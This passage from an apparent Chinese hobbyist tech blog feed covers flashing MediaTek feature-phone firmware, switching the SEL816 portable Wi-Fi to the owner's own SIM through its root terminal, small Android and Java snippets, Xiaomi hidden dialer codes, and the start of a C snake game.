alt="img"></p><p>检测完成如下图</p><p><img src="/img/preloader.gif" data-original="14.jpg" alt="img"></p><p>然后点击第二步，重建固件（功能机线刷包）。</p><p><img src="/img/preloader.gif" data-original="15.jpg" alt="img"></p><p>重建出来会多出来入下面这些文件，可以用来线刷。然后mtk功能机的系统（字库）备份就结束了</p><p><img src="/img/preloader.gif" data-original="6.jpg" alt="img"></p><p>==============刷机有风险==============</p><p>接下来尝试刷入其他功能机的系统看看，因为备份了系统，所以到时如输入其他手机的系统不能开机，还可以刷回来。（但是依然有风险刷不回来或者出现其他问题<img src="/img/preloader.gif" data-original="/coolapk-emotion/81_naikezui.gif" alt="img">）</p><p>步骤一样，找别人备份的同一个CPU的功能机字库文件，如果里面有cfg引导文件就可以用mtk线刷工具直接刷。如果没有就要用分解工具分解出cfg文件。<br>接下来刷入一台三防功能机的系统。加载好引导，点download，然后联机。进度条走动就开始刷机</p><p><img src="/img/preloader.gif" data-original="16.jpg" alt="img"></p><p>刷机完成</p><p><img src="/img/preloader.gif" data-original="17.jpg" alt="img"></p><p>然后就是期待运气。能开机</p><p><img src="/img/preloader.gif" data-original="18.jpg" alt="img"><br><img src="/img/preloader.gif" data-original="19.jpg" alt="img"><br><img src="/img/preloader.gif" data-original="20.jpg" alt="img"></p><p>下面是之前刷其他手机的图片。</p><p><img src="/img/preloader.gif" data-original="21.jpg" alt="img"><br><img src="/img/preloader.gif" data-original="22.jpg" alt="img"><br><img src="/img/preloader.gif" data-original="23.jpg" alt="img"><br><img src="/img/preloader.gif" data-original="24.jpg" alt="img"><br><img src="/img/preloader.gif" data-original="25.jpg" alt="img"><br><img src="/img/preloader.gif" data-original="26.jpg" alt="img"></p><p>输入的这个系统能开机，但是按键错乱，声音正常，反正有bug，所以刷了也是白刷。显示正常，能开机已经非常不错。其实还有一堆可能的bug<img src="/img/preloader.gif" data-original="/coolapk-emotion/81_naikezui.gif" alt="img">除非你会改字库文件里面的参数。我曾经给一台mt6236的不支持冒泡mrp游戏的手机找到了了一个合适的系统刷入了支持mrp的功能系统。但是也有一些bug。那台手机好像是支持mrp，但是把mrp功能屏蔽了入口。</p><p>所以我刷机只是看看不同的手机里面有没有什么自带游戏或者多些什么功能，体验不一样的ui（bug）<img src="/img/preloader.gif" data-original="/coolapk-emotion/81_naikezui.gif" alt="img"></p><p>mtk其他soc型号的功能机也可以刷机，方法大同小异。早期的麻烦一些，不能直接USB数据线刷机</p><p><img src="/img/preloader.gif" data-original="27.jpg" alt="img"></p><p>最后总结:功能机刷机刷了白刷<img src="/img/preloader.gif" data-original="/coolapk-emotion/81_naikezui.gif" alt="img"></p><p>最后告诉一个mtk功能机小技巧，format 里面的fomat fat可以把功能机恢复出厂，解决功能机忘记密码的问题。另外两个选项的格式化不建议操作，可能掉IMEI或者把其他数据弄掉.</p><p><img src="/img/preloader.gif" data-original="28.jpg" alt="img"></p><p>==========无聊的刷机心得结束===========</p><p>#MTK#</p><p>转载自酷安@断桥风雨情 <a href="https://www.coolapk.com/feed/35966352?shareKey=MWI4NzVhOGFhZGQ5NjRlN2Y1NzE~&shareUid=778415&shareFrom=com.coolapk.market_12.5.4" target="_blank" rel="noopener">原帖</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>创景SEL816随身wifi切卡</title>
      <link href="/2023/chuang-jing-sel816-sui-shen-wifi-qie-qia/"/>
      <url>/2023/chuang-jing-sel816-sui-shen-wifi-qie-qia/</url>
      
        <content type="html"><![CDATA[<p>适用于创景SEL816随身wifi的强制切换Sim卡，可以使用自己sim卡来上网使用  </p><p>网上能找到这个随身wifi的切卡超级密码经测试都是失效的，我自己研究时发现下边方法可以直接切卡  </p><a id="more"></a>  <p>这个随身wifi好在直接开放了终端和root，所以有点折腾的可能性，连上随身wifi的热点后进入控制台</p><p>控制台链接<a href="http://192.168.0.1/terminal2.html" target="_blank" rel="noopener">http://192.168.0.1/terminal2.html</a></p><p>登录账户和密码都是 <code>admin</code> </p><p>登录控制台后一次输入下边命令即可使用自己的卡，每输入一行都需要按一次回车</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> /data/data/<span class="keyword">com</span>.webkey/<span class="keyword">files</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"1"</span> &gt; SIM_TYPE</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"1"</span> &gt; SIM_PRE_TYPE</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p> <code>SIM_TYPE</code> 和 <code>SIM_PRE_TYPE</code> 默认值为0，只能使用内置Sim，将其改为1后可以使用自己sim卡</p><p>三大运营商可以直接使用，广电卡进后台自己添加一个apn即可使用，接入点设置 <code>cbnet</code> 其他留空就行   </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>子线程中使用toast</title>
      <link href="/2023/zi-xian-cheng-zhong-shi-yong-toast/"/>
      <url>/2023/zi-xian-cheng-zhong-shi-yong-toast/</url>
      
        <content type="html"><![CDATA[<p>子线程中没法使用toast，可以使用下边方法</p><a id="more"></a>  <p>转到UI线程使用toast</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">runOnUiThread(<span class="name">new</span> Runnable() &#123;</span><br><span class="line"> @Override</span><br><span class="line"> public void run() &#123;</span><br><span class="line">  Toast.makeText(<span class="name">getContext</span>(), <span class="string">"toast"</span>, Toast.LENGTH_LONG).show()<span class="comment">;</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>使用Looper</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Looper</span>.</span></span>prepare<span class="literal">()</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Toast</span>.</span></span>make<span class="constructor">Text(<span class="params">getContext</span>()</span>, <span class="string">"toast"</span>, Toast.LENGTH_LONG).show<span class="literal">()</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Looper</span>.</span></span>loop<span class="literal">()</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JAVA向win10通知栏推送消息</title>
      <link href="/2023/java-xiang-win10-tong-zhi-lan-tui-song-xiao-xi/"/>
      <url>/2023/java-xiang-win10-tong-zhi-lan-tui-song-xiao-xi/</url>
      
        <content type="html"><![CDATA[<p>Win下利用通知显示提示信息，测试Win7也可以使用<a id="more"></a>  </p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import java.awt.*;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String<span class="literal">[]</span> args) throws AWTException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="module-access"><span class="module"><span class="identifier">SystemTray</span>.</span></span>is<span class="constructor">Supported()</span>) &#123;</span><br><span class="line">            Main nd = <span class="keyword">new</span> <span class="constructor">Main()</span>;</span><br><span class="line">            nd.display<span class="constructor">Tray()</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>err.println(<span class="string">"System tray not supported!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void display<span class="constructor">Tray()</span> throws AWTException &#123;</span><br><span class="line">        <span class="comment">//Obtain only one instance of the SystemTray object</span></span><br><span class="line">        SystemTray tray = <span class="module-access"><span class="module"><span class="identifier">SystemTray</span>.</span></span>get<span class="constructor">SystemTray()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//If the icon is a file</span></span><br><span class="line">        Image image = <span class="module-access"><span class="module"><span class="identifier">Toolkit</span>.</span></span>get<span class="constructor">DefaultToolkit()</span>.create<span class="constructor">Image(<span class="string">"icon.png"</span>)</span>;</span><br><span class="line">        <span class="comment">//Alternative (if the icon is on the classpath):</span></span><br><span class="line">        <span class="comment">//Image image = Toolkit.getDefaultToolkit().createImage(getClass().getResource("icon.png"));</span></span><br><span class="line"></span><br><span class="line">        TrayIcon trayIcon = <span class="keyword">new</span> <span class="constructor">TrayIcon(<span class="params">image</span>, <span class="string">"Tray Demo"</span>)</span>;</span><br><span class="line">        <span class="comment">//Let the system resize the image if needed</span></span><br><span class="line">        trayIcon.set<span class="constructor">ImageAutoSize(<span class="params">true</span>)</span>;</span><br><span class="line">        <span class="comment">//Set tooltip text for the tray icon</span></span><br><span class="line">        trayIcon.set<span class="constructor">ToolTip(<span class="string">"System tray icon demo"</span>)</span>;</span><br><span class="line">        tray.add(trayIcon);</span><br><span class="line"></span><br><span class="line">        trayIcon.display<span class="constructor">Message(<span class="string">"Hello, World"</span>, <span class="string">"notification demo"</span>, TrayIcon.MessageType.INFO)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>转载自 <a href="https://blog.csdn.net/qq_37740841/article/details/110729145" target="_blank" rel="noopener">一点博客：JAVA向win10通知栏推送消</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>开源免费的Office软件</title>
      <link href="/2023/kai-yuan-mian-fei-de-office-ruan-jian/"/>
      <url>/2023/kai-yuan-mian-fei-de-office-ruan-jian/</url>
      
        <content type="html"><![CDATA[<p>记录几个免费的office软件  </p><a id="more"></a><p><strong>LibreOffice</strong><br><a href="https://www.libreoffice.org/" target="_blank" rel="noopener">官网</a> | <a href="https://zh-cn.libreoffice.org/" target="_blank" rel="noopener">中文版官网</a></p><p><strong>OpenOffice</strong><br><a href="https://www.openoffice.org/" target="_blank" rel="noopener">官网</a> | <a href="https://www.openoffice.org/zh-cn/" target="_blank" rel="noopener">中文版官网</a></p><p><strong>OnlyOffice</strong><br><a href="https://www.onlyoffice.com/" target="_blank" rel="noopener">官网</a> | <a href="https://www.onlyoffice.com/zh/" target="_blank" rel="noopener">中文版官网</a></p><p><strong>FreeOffice</strong><br><a href="https://www.freeoffice.com/" target="_blank" rel="noopener">官网</a> | <a href="https://www.freeoffice.com/zh" target="_blank" rel="noopener">中文版官网</a><br>FreeOffice 是一款闭源软件</p><p>各个软件对比可以参考知乎这篇文章<a href="https://zhuanlan.zhihu.com/p/485216851" target="_blank" rel="noopener">横向对比 5 款微软 Office 替代品 | Linux 中国</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java swing 图形界面程序</title>
      <link href="/2023/java-swing-tu-xing-jie-mian-cheng-xu/"/>
      <url>/2023/java-swing-tu-xing-jie-mian-cheng-xu/</url>
      
        <content type="html"><![CDATA[<p>简单记录下java的图形界面程序  </p><a id="more"></a><p>设置setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE)表示窗口关闭结束程序运行，否则默认只是设置setVisable(false)，程序依然运行</p><p>设置setLocationRelativeTo(null)，可以让程序窗口居中运行</p><p>在panel中动态添加移除组件，可以使用updateUI()或repaint()刷新显示</p><p>如果窗口关闭后需要执行其他操作，可以使用addWindowListener()重写windowClosing()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        JFrame jFrame = <span class="keyword">new</span> JFrame(<span class="string">"窗口标题"</span>);</span><br><span class="line">        jFrame.setSize(<span class="number">480</span>, <span class="number">480</span>);</span><br><span class="line">        jFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<span class="comment">//窗口关闭结束程序</span></span><br><span class="line">        jFrame.setLocationRelativeTo(<span class="keyword">null</span>);<span class="comment">//窗口居中</span></span><br><span class="line">        JPanel panel = <span class="keyword">new</span> JPanel();</span><br><span class="line">        jFrame.add(panel);</span><br><span class="line">        panel.setLayout(<span class="keyword">null</span>);</span><br><span class="line">        JButton jButton = <span class="keyword">new</span> JButton(<span class="string">"添加"</span>);</span><br><span class="line">        jButton.setBounds(<span class="number">10</span>,<span class="number">10</span>,<span class="number">440</span>,<span class="number">200</span>);</span><br><span class="line">        panel.add(jButton);</span><br><span class="line">        jButton.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">                JLabel jLabel = <span class="keyword">new</span> JLabel(<span class="string">"helloword"</span>);</span><br><span class="line">                jLabel.setBounds(<span class="number">10</span>,<span class="number">220</span>,<span class="number">440</span>,<span class="number">100</span>);</span><br><span class="line">                panel.add(jLabel);</span><br><span class="line">                panel.updateUI();</span><br><span class="line">                <span class="comment">//panel.repaint();</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        jFrame.addWindowListener(<span class="keyword">new</span> WindowAdapter() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">windowClosing</span><span class="params">(WindowEvent e)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.windowClosing(e);</span><br><span class="line">                <span class="comment">//窗口关闭时执行操作</span></span><br><span class="line">                System.out.println(<span class="string">"窗口关闭"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        jFrame.setVisible(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IP查看</title>
      <link href="/2023/ip-cha-kan/"/>
      <url>/2023/ip-cha-kan/</url>
      
        <content type="html"><![CDATA[<p>查询当前设备的IP地址，同时收录了多个IP查询网站  </p><a id="more"></a><iframe src="https://ip.skk.moe/simple" style="width: 100%; border: 0"></iframe><p><a target="_blank" href="https://tool.lu/ip/"><img border="0" src="/img/preloader.gif" data-original="https://tool.lu/netcard/"></a><br><br><br><a target="_blank" href="https://www.ipip5.com/"><img border="0" alt="ip签名图片" src="/img/preloader.gif" data-original="https://www.ipip5.com/ipimg"></a><br><br></p><blockquote><p>国内多接口IP查询 <a href="https://www.ipip5.com/" target="_blank" rel="noopener">https://www.ipip5.com/</a></p></blockquote><blockquote><p>全网IP查询<br><a href="https://ip.blw.moe/" target="_blank" rel="noopener">https://ip.blw.moe/</a><br><a href="https://ip.skk.moe/" target="_blank" rel="noopener">https://ip.skk.moe/</a><br><a href="http://ip111.cn/" target="_blank" rel="noopener">http://ip111.cn/</a>  </p></blockquote><blockquote><p><a href="https://nstool.netease.com/" target="_blank" rel="noopener">网易DNS检测工具</a> | <a href="/ua/">浏览器UA查看</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>打开小米隐藏开关</title>
      <link href="/2023/da-kai-xiao-mi-yin-cang-kai-guan/"/>
      <url>/2023/da-kai-xiao-mi-yin-cang-kai-guan/</url>
      
        <content type="html"><![CDATA[<p>开启显示后开关位于 设置 - 双卡和移动网络 - Sim卡信息 设置内  </p><a id="more"></a><p><button onclick="jump('86583')">VoLTE  <code>*#*#86583#*#*</code> </button>     </p><p><button onclick="jump('8667')">VoNR  <code>*#*#8667#*#*</code> </button>   </p><p><button onclick="jump('869434')">VoWiFi  <code>*#*#869434#*#*</code> </button>   </p><p><button onclick="jump('54638')">5G开关  <code>*#*#54638#*#*</code> </button>   </p><p><button onclick="jump('726633')">5G网络模式选择  <code>*#*#726633#*#*</code> </button>   </p><p><button onclick="jump('3646633')">EngineerMode  <code>*#*#3646633#*#*</code> </button>  </p><p>EngineerMode，联发科的应该工程模式，可以实现锁频段等一些操作</p><p>若使用电脑打开网页，在手机拨号盘输入上面指令即可<br>若使用手机打开网页，直接点击即可跳转拨号器，再输入 <code>*</code> 即可执行</p><p>小米新手机上隐藏了网络优先级设置，可以在开发者选项打开 <code>启用网络类型选择菜单</code> ，打开后可以在Sim卡信息页面设置网络优先级</p><script>function jump(code){window.location.href="tel:*%23*%23"+code+"%23*%23";}</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>贪吃蛇</title>
      <link href="/2023/tan-chi-she/"/>
      <url>/2023/tan-chi-she/</url>
      
        <content type="html"><![CDATA[<p>经典小游戏贪吃蛇，mpc程序  </p><a id="more"></a><p>支持触屏+按键，使用<a href="https://www.yzjlb.net/app/opmrcc/" target="_blank" rel="noopener">手机CAPP</a> 运行  </p><p>冒泡开发实验系统自带贪吃蛇例程，可以在<a href="https://vmrp.gddhy.net/" target="_blank" rel="noopener">vmrp</a> 中体验（仅支持按键）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">贪吃蛇</span></span><br><span class="line"><span class="comment">by eleqian</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">按键：</span></span><br><span class="line"><span class="comment">上下左右：改变方向</span></span><br><span class="line"><span class="comment">左软键：开始/暂停</span></span><br><span class="line"><span class="comment">右软键：退出/加速</span></span><br><span class="line"><span class="comment">触屏：</span></span><br><span class="line"><span class="comment">自己体验</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;base.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;exb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sw SCRW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sh SCRH-50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> s 300 <span class="comment">//速度(定时器时长)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> js 80 <span class="comment">//加速速度</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> v 20 <span class="comment">//蛇，食物像素大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*全局变量*/</span></span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">50</span>];</span><br><span class="line"><span class="keyword">int</span> linc, colc, xside, yside;</span><br><span class="line"><span class="keyword">int</span> food, last, slen, maxl, state,l,n;</span><br><span class="line">int32 timer;</span><br><span class="line"><span class="keyword">char</span> txt[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span 